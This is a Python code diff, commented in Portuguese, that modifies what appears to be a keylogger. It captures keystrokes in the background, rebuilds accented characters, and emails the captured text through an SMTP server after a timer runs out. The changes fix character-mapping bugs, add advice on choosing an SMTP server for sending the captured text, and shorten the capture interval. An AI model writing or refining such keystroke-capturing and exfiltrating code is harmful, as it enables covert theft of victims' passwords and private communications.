@@ -220,7 +220,7 @@ def formatar_letras(letras):
                         letras_formatadas.append("e")
 
                 else:
-                    letras_formatadas.append("a")
+                    letras_formatadas.append("e")
 
             elif letra == "E":
                 if len(letras_formatadas) > 0:
@@ -244,7 +244,7 @@ def formatar_letras(letras):
                         letras_formatadas.append("E")
 
                 else:
-                    letras_formatadas.append("a")
+                    letras_formatadas.append("E")
 
             elif letra == "i":
                 if len(letras_formatadas) > 0:
@@ -268,7 +268,7 @@ def formatar_letras(letras):
                         letras_formatadas.append("i")
 
                 else:
-                    letras_formatadas.append("a")
+                    letras_formatadas.append("i")
 
             elif letra == "I":
                 if len(letras_formatadas) > 0:
@@ -292,7 +292,7 @@ def formatar_letras(letras):
                         letras_formatadas.append("I")
 
                 else:
-                    letras_formatadas.append("a")
+                    letras_formatadas.append("I")
 
             elif letra == "o":
                 if len(letras_formatadas) > 0:
@@ -320,7 +320,7 @@ def formatar_letras(letras):
                         letras_formatadas.append("o")
 
                 else:
-                    letras_formatadas.append("a")
+                    letras_formatadas.append("o")
 
             elif letra == "O":
                 if len(letras_formatadas) > 0:
@@ -348,7 +348,7 @@ def formatar_letras(letras):
                         letras_formatadas.append("O")
 
                 else:
-                    letras_formatadas.append("a")
+                    letras_formatadas.append("O")
 
             elif letra == "u":
                 if len(letras_formatadas) > 0:
@@ -373,7 +373,7 @@ def formatar_letras(letras):
                         letras_formatadas.append("u")
 
                 else:
-                    letras_formatadas.append("a")
+                    letras_formatadas.append("u")
 
             elif letra == "U":
                 if len(letras_formatadas) > 0:
@@ -397,7 +397,7 @@ def formatar_letras(letras):
                         letras_formatadas.append("U")
 
                 else:
-                    letras_formatadas.append("a")
+                    letras_formatadas.append("U")
 
             elif letra.capitalize() == "Key.backspace":
                 # Caso haja algum elemento na lista, o último será apagado ao pressionar backspace
@@ -454,7 +454,7 @@ def enviar_email():
     mensagem = mensagem_final
 
     # Configurando servidor smtp
-    servidor_smtp = "smtp.servidor.com"
+    servidor_smtp = "smtp.servidor.com"  # Use um servidor que tenha autenticação apenas com e-mail e senha
     porta_smtp = 587  # A porta padrão da Lib também funciona, que é a 25, mas a 587 é mais comumente usada
 
     try:
@@ -501,8 +501,8 @@ def cronometro():
     global cronometro_finalizou
     # Cronômetro inicia em segundo plano, enquanto captura as teclas
     # Caso queria mudar alterar o valor do temporizador e do range do loop
-    temporizador = 60
-    for t in range(60):
+    temporizador = 10
+    for t in range(10):
         temporizador -= 1
         sleep(1)
 
